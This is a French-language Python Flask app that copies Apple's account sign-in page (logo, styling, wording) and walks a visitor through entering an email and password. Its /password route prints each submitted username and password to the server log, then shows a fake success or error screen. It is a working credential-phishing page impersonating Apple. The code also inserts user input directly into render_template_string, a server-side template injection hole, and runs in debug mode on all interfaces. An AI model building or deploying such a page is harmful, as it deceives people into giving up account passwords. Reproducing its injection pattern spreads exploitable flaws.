from flask import Flask, request, render_template_string, redirect, url_for

app = Flask(__name__)

# Données de session simulées (en production, utiliser Flask-Session)
app.secret_key = 'votre_cle_secrete_ici'  # Nécessaire pour les sessions

# Configuration pour les identifiants valides
VALID_CREDENTIALS = {
    'username': 'youva',
    'password': '1234'
}

base_html = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Compte Apple</title>
    <style>
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #f5f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 0;
        }}
        .login-container {{
            width: 380px;
            padding: 200px 40px; 
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            text-align: center;
        }}
        .apple-logo {{
            width: 44px;
            height: 44px;
            margin-bottom: 20px;
        }}
        h1 {{
            font-size: 24px;
            font-weight: 600;
            margin: 0 0 20px 0;
            color: #1d1d1f;
        }}
        .input-container {{
            position: relative;
            margin-bottom: 15px;
        }}
        .input-field {{
            width: 100%;
            padding: 15px 45px 15px 15px;
            font-size: 16px;
            border: 1px solid #d2d2d7;
            border-radius: 8px;
            box-sizing: border-box;
        }}
        .input-field:focus {{
            border-color: #0071e3;
            outline: none;
        }}
        .submit-btn {{
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #0071e3;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            padding: 0 5px;
        }}
        .checkbox-container {{
            text-align: left;
            margin: 20px 0;
            font-size: 14px;
            color: #1d1d1f;
        }}
        .link {{
            display: block;
            color: #0071e3;
            text-decoration: none;
            font-size: 14px;
            margin: 10px 0;
        }}
        .link:hover {{
            text-decoration: underline;
        }}
        .error-message {{
            color: #ff3b30;
            font-size: 13px;
            margin: -10px 0 15px 0;
            text-align: left;
        }}
        .username-display {{
            text-align: left;
            font-size: 14px;
            color: #1d1d1f;
            margin-bottom: 15px;
        }}
        .username-box {{
        background-color: #f5f5f7;
        border-radius: 8px;
        padding: 12px 15px;
        margin-bottom: 15px;
        text-align: left;
        font-size: 14px;
        }}
    
        .username-label {{
            color: #86868b;
            font-size: 12px;
        }}
        
        .username-value {{
            color: #1d1d1f;
            font-weight: normal;
            margin-top: 3px;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" 
             alt="Apple Logo" class="apple-logo">
        <h1>Se connecter avec un compte Apple</h1>
        {content}
    </div>
</body>
</html>
"""

username_screen = """
<form method="POST" action="/username">
    <div class="input-container">
        <input type="text" name="username" class="input-field" placeholder="Courriel ou numéro de téléphone" required>
        <button type="submit" class="submit-btn">→</button>
    </div>
    <div class="checkbox-container">
        <input type="checkbox" id="stay_connected" name="stay_connected">
        <label for="stay_connected">Rester connecté</label>
    </div>
    <a href="#" class="link">Mot de passe oublié?</a>
    <a href="#" class="link">Créer un compte Apple</a>
</form>
"""

password_screen = """
<div class="username-box">
    <div class="username-label">Courriel ou numéro de téléphone</div>
    <div class="username-value">{username}</div>
</div>
<form method="POST" action="/password">
    <input type="hidden" name="username" value="{username}">
    <div class="input-container">
        <input type="password" name="password" class="input-field" placeholder="Mot de passe" required>
        <button type="submit" class="submit-btn">→</button>
    </div>
    <div class="checkbox-container">
        <input type="checkbox" id="stay_connected" name="stay_connected">
        <label for="stay_connected">Rester connecté</label>
    </div>
    <a href="#" class="link">Mot de passe oublié?</a>
    <a href="#" class="link">Créer un compte Apple</a>
</form>
"""

error_screen = """
<form method="POST" action="/username">
    <div class="input-container">
        <input type="text" name="username" class="input-field" placeholder="Courriel ou numéro de téléphone" value="{username}" required>
        <button type="submit" class="submit-btn">→</button>
    </div>
    <div class="error-message">
        <strong>Mot de passe</strong><br>
        Vérifiez les informations de compte que vous avez entrées et réessayez.
    </div>
    <div class="checkbox-container">
        <input type="checkbox" id="stay_connected" name="stay_connected">
        <label for="stay_connected">Rester connecté</label>
    </div>
    <a href="#" class="link">Mot de passe oublié?</a>
    <a href="#" class="link">Créer un compte Apple</a>
</form>
"""

success_screen = """
<div style="padding: 20px; text-align: center;">
    <h2 style="color: #1d1d1f;">Connexion réussie</h2>
    <p style="color: #86868b;">Bienvenue, {username}!</p>
</div>
"""

@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        return redirect(url_for("handle_username", username=username))
    
    return render_template_string(base_html.format(content=username_screen))

@app.route("/username", methods=["GET", "POST"])
def handle_username():
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        return render_template_string(base_html.format(
            content=password_screen.format(username=username)
        ))
    
    return redirect(url_for("home"))

@app.route("/password", methods=["POST"])
def handle_password():
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()
    
    # Enregistrement côté serveur (simulé)
    print(f"\n[LOG] Tentative de connexion reçue:")
    print(f"Username: {username}")
    print(f"Password: {password}\n")
    
    # Validation des identifiants
    if username == VALID_CREDENTIALS['username'] and password == VALID_CREDENTIALS['password']:
        return render_template_string(base_html.format(
            content=success_screen.format(username=username)
        ))
    else:
        return render_template_string(base_html.format(
            content=error_screen.format(username=username)
        ))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)
